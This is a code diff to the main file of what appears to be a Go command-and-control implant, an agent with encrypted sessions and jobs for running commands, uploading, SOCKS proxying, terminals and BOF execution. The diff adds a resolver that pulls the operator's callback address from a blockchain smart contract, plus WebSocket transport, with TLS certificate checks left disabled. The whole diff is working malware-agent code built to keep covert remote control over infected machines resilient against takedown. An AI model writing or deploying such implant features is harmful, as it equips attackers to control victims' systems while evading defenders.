@@ -12,6 +12,7 @@ import (
 	"os/user"
 	"path/filepath"
 	"runtime"
+	"strings"
 	"time"
 
 	"github.com/vmihailenco/msgpack/v5"
@@ -83,6 +84,11 @@ var profile utils.Profile
 var AgentId uint32
 var encKey []byte
 
+// activeResolver is the chain-domain resolver created in main(). Job
+// connections (run/upload/socks/terminal/BOF) reuse it so they reach the same
+// web3-resolved callback as the primary session.
+var activeResolver *chainResolver
+
 func main() {
 
 	for _, encProfile := range encProfiles {
@@ -111,6 +117,18 @@ func main() {
 	profileIndex = 0
 	profile = profiles[profileIndex]
 	encKey = encKeys[profileIndex]
+
+	var resolver *chainResolver
+	if profile.ChainEnabled && profile.ChainRPC != "" && profile.ChainContract != "" {
+		resolver = newChainResolver(chainResolverConfig{
+			RPC:          profile.ChainRPC,
+			ChainID:      profile.ChainID,
+			Contract:     profile.ChainContract,
+			PollInterval: time.Duration(profile.ChainPollSec) * time.Second,
+		})
+		resolver.Start()
+	}
+	activeResolver = resolver
 
 	sessionInfo, sessionKey := CreateInfo()
 	utils.SKey = sessionKey
@@ -150,7 +168,13 @@ func main() {
 			conn net.Conn
 		)
 
-		if profile.UseSSL {
+		addr := profile.Addresses[addrIndex]
+		if resolver != nil {
+			addr = resolver.Rewrite(addr)
+		}
+		if strings.HasPrefix(addr, "wss://") || strings.HasPrefix(addr, "ws://") {
+			conn, err = dialWebSocket(addr)
+		} else if profile.UseSSL {
 			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
 			if certerr != nil {
 				continue
@@ -164,15 +188,18 @@ func main() {
 				RootCAs:            caCertPool,
 				InsecureSkipVerify: true,
 			}
-			conn, err = tls.Dial("tcp", profile.Addresses[addrIndex], config)
+			conn, err = tls.Dial("tcp", addr, config)
 
 		} else {
-			conn, err = net.Dial("tcp", profile.Addresses[addrIndex])
+			conn, err = net.Dial("tcp", addr)
 		}
 		if err != nil {
 			continue
 		} else {
 			i = 0
+		}
+		if resolver != nil && !resolver.SetActiveConn(conn, addr) {
+			continue
 		}
 
 		/// Recv Banner
@@ -220,6 +247,9 @@ func main() {
 			sendData, _ = msgpack.Marshal(outMessage)
 			sendData, _ = utils.EncryptData(sendData, sessionKey)
 			_ = functions.SendMsg(conn, sendData)
+		}
+		if resolver != nil {
+			resolver.ClearActiveConn(conn)
 		}
 	}
 }
